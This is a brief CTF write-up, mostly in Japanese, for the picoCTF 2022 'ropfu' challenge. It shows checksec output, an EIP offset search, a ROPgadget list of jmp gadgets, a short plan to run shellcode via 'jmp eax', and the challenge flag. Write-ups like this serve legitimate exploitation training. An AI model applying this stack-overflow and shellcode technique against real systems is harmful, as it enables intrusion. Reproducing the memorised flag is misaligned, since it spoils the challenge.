## Description
What's ROP?
Can you exploit the following program to get the flag? Download source.
nc saturn.picoctf.net 50294

## Writeup
```
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=3aa2bb6a5bf44d90a355da83fa909bbf5d9d90ce, for GNU/Linux 3.2.0, not stripped
$ checksec vuln
[*] '/home/pwn/challenges/picoCTF2022/ropfu/attachment/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

静的リンクされている。

```
gef➤  pattern search $eip
[+] Searching for '68616161'/'61616168' with period=4
[+] Found at offset 28 (little-endian search) likely
```

eipに加えて、eax, ebx, esp, ebpを操作できる。
eaxにシェルを起動するシェルコードを格納して、jmpすればいい。

```
$ ROPgadget --binary vuln | grep ": jmp"
(snip)
0x0805334b : jmp eax
0x08056802 : jmp ebp
0x08049bdf : jmp ebx
0x0804f64e : jmp ecx
0x0804a8a3 : jmp edi
0x0804f3e9 : jmp edx
0x080a6280 : jmp esi
```

`0x0805334b`を使う。`rax`には`0x0805334b`が格納され、これが命令列として解釈されるため途中で4バイトジャンプさせる。

Flag: `picoCTF{5n47ch_7h3_5h311_5b4fc869}`